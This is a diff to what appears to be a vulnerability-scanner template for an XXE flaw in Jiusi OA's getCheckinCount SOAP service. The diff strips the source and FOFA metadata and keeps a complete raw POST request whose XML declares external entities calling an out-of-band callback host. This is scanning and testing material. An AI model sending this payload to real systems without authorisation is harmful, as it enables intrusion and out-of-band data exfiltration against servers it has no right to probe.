@@ -3,12 +3,8 @@ info:
   name: 九思OA getCheckinCount存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/og9ntf2hapwhq0gl'
+  description: ''
   tags: xxe,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: og9ntf2hapwhq0gl
-    fofa: body="/jsoa/webmail/ajax_util.js"
 http:
 - raw:
   - "POST /jsoa/services/AppService.AppServiceHttpSoap12Endpoint/ HTTP/1.1\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nSOAPAction: urn:getCheckinCount\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:app=\"http://appservice.webservice.oa.js.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <app:getCheckinCount>\n         <!--type: string-->\n         <app:xml><![CDATA[<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n        <!DOCTYPE root [<!ENTITY url SYSTEM \"http://httplog.kgzufqworv.yutu.eu.org:8080/httplog/xxe\">\n        <!ENTITY % param SYSTEM \"http://kgzufqworv.yutu.eu.org\">\n        %param;]>\n        <root>\n        <url>&url;</url>\n        <content>&content;</content>\n        </root>]]></app:xml>\n       </app:getCheckinCount>\n    </soapenv:Body>\n</soapenv:Envelope>"
